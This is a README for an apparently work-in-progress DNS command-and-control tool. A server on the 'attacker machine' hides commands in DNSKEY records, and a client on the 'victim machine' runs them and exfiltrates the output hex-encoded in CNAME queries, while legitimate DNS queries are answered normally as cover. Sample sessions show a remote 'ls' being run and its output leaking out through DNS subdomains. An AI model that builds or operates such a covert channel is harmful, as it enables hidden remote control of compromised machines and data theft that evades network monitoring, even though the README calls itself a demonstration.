WiP weaponized CnC through DNS.

this is just a demonstration of how to use DNS as a CnC server.
To execute, just run dns_dirty_server.py on the attacker machine, by default it listen on 127.0.0.1:4242.
Then run dns_dirty_client.py on the victim machine, by default it will try to connect to 127.0.0.1:4242.

how it works:
  - The server will act as a real DNS server, and can answer to any DNS query.
  - The server can overwrite DNS records on the fly, based on value in the dns_beacon.json file.
  - The client will send a DNS query to the server, and the server will answer with the value in the dns_beacon.json file or with the real DNS response.
  - If the client make a query of the type "DNSKEY", then the server will catch it, ask for the payload, and store it in the DNSKEY record.
  - Then the client will execute the payload, and send the result to the server through a DNS query of the type "CNAME".
  - The server will catch the result from the CNAME query, reconstruct the result, and print it.


Example for a simple ls command:
```shell
>> python dns_dirty_server.py 
DNS is listening on 127.0.0.1:4242
Enter the answer for toto.org. (DNSKEY): ls
README.md
dns_beacon.json
dns_dirty_server.py
wrapper_dirty.py
```

``` shell
>> python wrapper_dirty.py 
2a524541444d452e6d640a646e735f626561636f6e2e6a736f6e0a646e735f.toto.org
1a64697274795f7365727665722e70790a777261707065725f64697274792e.toto.org
0a70790a.toto.org
```

and for a legit DNS query:
```shell
 >> python dns_dirty_server.py 
DNS is listening on 127.0.0.1:4242
```

```shell
>> dig A google.fr @127.0.0.1 -p 4242

; <<>> DiG 9.20.4 <<>> A google.fr @127.0.0.1 -p 4242
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56507
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;google.fr.			IN	A

;; ANSWER SECTION:
google.fr.		75	IN	A	216.58.214.163

;; Query time: 16 msec
;; SERVER: 127.0.0.1#4242(127.0.0.1) (UDP)
;; WHEN: Wed Jan 01 13:39:46 CET 2025
;; MSG SIZE  rcvd: 43
```
